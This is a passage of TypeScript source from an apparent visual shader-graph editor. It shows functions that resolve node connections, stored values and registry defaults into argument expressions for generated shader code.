  // (the node has no single value), so address the channel by its handle id.
  // `micChannelForHandle` is the SAME normalization the emitter used, so a
  // hand-edited handle in a `.fastshader` resolves to a variable that exists.
  if (sourceNode.data.registryType === 'micNode') {
    const base = varNames.get(sourceNode.id);
    if (!base) return null;
    const u = micUniformName(base, micChannelForHandle(edge.sourceHandle));
    // With gain applied, downstream reads the SCALED variable, not the raw
    // uniform — the uniform line itself must stay a bare `uniform(0)` so
    // buildShaderModule's uniformLineRe still turns it into a schema property.
    return micGainExpr(sourceNode, edges, varNames, sorted) ? `_${u}` : u;
  }

  // Data Viz: the `value` handle exposes the tone-mapped scalar (`_<var>_t`,
  // a float 0–1) instead of the coloured `out` vec3 — so displacement can be
  // driven by the data height independently of the chosen ramp colours.
  if (sourceNode.data.registryType === 'dataviz' && edge.sourceHandle === 'value') {
    const base = varNames.get(sourceNode.id);
    return base ? `_${base}_t` : null;
  }

  // If source is a split node, inline as inputVar.component
  if (sourceNode.data.registryType === 'split' && edge.sourceHandle && edge.sourceHandle !== 'out' && VALID_SWIZZLE.has(edge.sourceHandle)) {
    const splitInputEdge = edges.find(e => e.target === sourceNode.id && e.targetHandle === 'v');
    if (splitInputEdge && varNames.has(splitInputEdge.source)) {
      return `${varNames.get(splitInputEdge.source)}.${edge.sourceHandle}`;
    }
  }

  return varNames.get(edge.source) ?? null;
}

function resolveArguments(
  node: AppNode,
  edges: AppEdge[],
  varNames: Map<string, string>,
  def: NodeDefinition,
  sorted: AppNode[]
): string[] {
  // Chainable arithmetic emits a variadic call over its wired operands (plus any
  // interior gaps filled with the identity) — `includeTrailingEmpty=false` drops
  // the dangling grow socket so we never emit e.g. `add(a, b, 0)`. Stored values
  // on extension operands (imported `add(x, 2, 3)`) are honored via valuedHandles.
  const nodeVals = getNodeValues(node);
  const connected = edges
    .filter((e) => e.target === node.id && typeof e.targetHandle === 'string')
    .map((e) => e.targetHandle as string);
  const inputs = effectiveInputs(def, connected, false, Object.keys(nodeVals));
  return inputs.map((input) => {
    const edge = edges.find(
      (e) => e.target === node.id && e.targetHandle === input.id
    );
    if (edge) {
      const ref = resolveEdgeRef(edge, edges, varNames, sorted);
      if (ref) return ref;
    }
    // No connection: use node's stored value, then the registry default for this
    // port, then the chain identity, then a bare placeholder. Consulting
    // defaultValues keeps a legacy node (created before the default existed, so
    // it has no stored value) in sync with the evaluator/UI — e.g. min's unwired
    // `b` emits `min(a, 1)`, not `min(a, 0)`; an unwired mul operand emits `1`.
    const val = nodeVals[input.id];
    if (val !== undefined) return String(val);
    const dflt = def.defaultValues?.[input.id];
    if (dflt !== undefined) return String(dflt);
    if (def.chainable && def.chainIdentity !== undefined) return String(def.chainIdentity);
    return '0';
  });
}

/** Resolve an exposed parameter: if an edge connects to it, use the variable ref; else use stored value. */
function resolveExposedParam(
  node: AppNode,
  key: string,
  edges: AppEdge[],
  varNames: Map<string, string>,
  nodeValues: Record<string, string | number>,
  sorted: AppNode[],
): string {
  // Check if there's an edge connected to this exposed port
  const edge = edges.find(
    (e) => e.target === node.id && e.targetHandle === key
  );
  if (edge) {
    const ref = resolveEdgeRef(edge, edges, varNames, sorted);
    if (ref) return ref;
  }
  return String(nodeValues?.[key] ?? 1);
}

